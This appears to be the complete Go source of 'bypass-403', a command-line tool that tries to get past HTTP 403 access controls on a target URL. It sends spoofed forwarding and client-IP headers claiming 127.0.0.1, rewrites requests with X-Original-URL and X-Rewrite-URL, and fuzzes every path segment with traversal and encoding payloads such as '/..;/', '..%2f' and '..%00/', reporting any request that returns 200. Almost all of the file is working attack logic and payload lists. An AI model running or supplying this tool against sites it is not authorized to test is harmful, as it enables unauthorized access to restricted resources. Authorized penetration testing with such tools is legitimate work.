package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	version     = "0.0.1"
	fuzzerKey   = "FUZZ"
	headerValue = "127.0.0.1"
)

type (
	Config struct {
		Url     string
		URI     *url.URL
		Silent  bool
		Json    bool
		Threads int
		Timeout int
	}

	Target struct {
		Host        string
		HeaderKey   string
		HeaderValue string
	}

	Output struct {
		Code   int
		Target string
		Header string
	}
)

var (
	config         Config
	headerPayloads = []string{
		"X-Custom-IP-Authorization",
		"X-Forwarded-For",
		"X-ProxyUser-Ip",
		"X-Forwarded-Host",
		"X-Originating-IP",
		"X-Forwarded-port",
		"X-Forwarded-by",
		"X-Forwarded-Scheme",
		"X-Frame-Options",
		"X-Client-IP",
		"X-Remote-IP",
		"X-Remote-Addr",
		"Client-IP",
		"X-Host",
	}

	urlHeader = []string{
		"X-Original-URL",
		"X-rewrite-url",
	}

	urlPayloads = []string{
		"؟",
		"؟؟",
		"&",
		"#",
		"%",
		"%20",
		"%09",
		"/",
		"/..;/",
		"../",
		"/",
		"/*",
		"/%2f/",
		"/./",
		"./.",
		"/*/",
		"?",
		"??",
		"&",
		"#",
		"%",
		"%20",
		"%09",
		"/..;/",
		"../",
		"..%2f",
		"..;/",
		".././",
		"..%00/",
		"..%0d",
		"..%5c",
		"..%ff/",
		"%2e%2e%2f",
		".%2e/",
		"%3f",
		"%26",
		"%23",
		".json",
	}

	stdout *log.Logger
)

func main() {
	log.SetFlags(0)
	stdout = log.New(os.Stdout, "", 0)
	parseArguments()
	if !config.Silent {
		showBanner()
	}

	targets := make(chan Target, 0)
	wg := sync.WaitGroup{}
	wg.Add(config.Threads)

	for config.Threads > 0 {
		config.Threads -= 1
		go func() {
			for {
				target := <-targets
				if target.Host == "" {
					break
				}
				checkTarget(target)
			}
			wg.Done()
		}()
	}

	us := config.URI.String()
	targets <- Target{Host: us, HeaderKey: "Origin", HeaderValue: "null"}
	for _, hk := range headerPayloads {
		targets <- Target{Host: us, HeaderKey: hk, HeaderValue: headerValue}
	}

	u := getUrl()
	up := u.Path
	u.Path = ""
	us = u.String()
	for _, hk := range urlHeader {
		targets <- Target{Host: us, HeaderKey: hk, HeaderValue: up}
	}

	fl := buildTargetList()
	for _, f := range fl {
		for _, p := range urlPayloads {
			targets <- Target{Host: strings.Replace(f, fuzzerKey, p, 1)}
		}
	}

	close(targets)
	wg.Wait()

}

func buildTargetList() []string {
	parts := strings.Split(config.URI.Path, "/")
	list := make([]string, 0, len(parts))
	for i := 0; i < len(parts); i++ {
		p := make([]string, len(parts))
		copy(p, parts)
		p[i] = fuzzerKey + strings.TrimSpace(p[i])
		u := getUrl()
		u.Path = strings.Join(p, "/")
		list = append(list, u.String())
		t := strings.ToUpper(p[i])
		if t != p[i] {
			p[i] = t
			u.Path = strings.Join(p, "/")
			list = append(list, u.String())
		}
	}
	u := getUrl()
	u.Path += fuzzerKey
	list = append(list, u.String())
	return list
}

func getUrl() *url.URL {
	u, err := url.Parse(config.URI.String())
	if err != nil {
		log.Fatalln(err)
	}
	return u
}

func checkTarget(target Target) {
	code, err := Request(target, time.Duration(config.Timeout)*time.Second)
	if err != nil {
		return
	}
	var res string

	h := ""
	if target.HeaderKey != "" {
		h = target.HeaderKey + ":" + target.HeaderValue
	}

	if config.Json {
		v := Output{code, target.Host, h}
		o, err := json.Marshal(v)
		if err != nil {
			return
		}
		res = string(o)
	} else {
		res = fmt.Sprintf("%v\t%v\t%v\n", code, target.Host, h)
	}
	if code != 200 {
		if !config.Silent {
			log.Printf(res)
		}
		return
	}
	stdout.Printf(res)
}

func showBanner() {
	log.Println("\n██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗░░░░░░░░██╗██╗░█████╗░██████╗░\n██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝░░░░░░░██╔╝██║██╔══██╗╚════██╗\n██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░█████╗██╔╝░██║██║░░██║░█████╔╝\n██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗╚════╝███████║██║░░██║░╚═══██╗\n██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝░░░░░░╚════██║╚█████╔╝██████╔╝\n╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░░░░░░░░░░░░╚═╝░╚════╝░╚═════╝░", version)
}

func parseArguments() {
	flag.BoolVar(&config.Silent, "silent", false, "Disable banner")
	flag.BoolVar(&config.Json, "json", false, "Output format as json")
	flag.StringVar(&config.Url, "url", "", "Url to check")
	flag.IntVar(&config.Threads, "t", 10, "Number of threads to use")
	flag.IntVar(&config.Timeout, "timeout", 10, "Seconds to wait before timeout.")
	flag.Parse()

	ok, u := isValidUrl(config.Url)
	if !ok {
		log.Println("invalid url:", config.Url)
		flag.Usage()
		os.Exit(1)
	}
	config.URI = u
}

func isValidUrl(toTest string) (bool, *url.URL) {
	_, err := url.ParseRequestURI(toTest)
	if err != nil {
		return false, nil
	}

	u, err := url.Parse(toTest)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return false, nil
	}

	return true, u
}
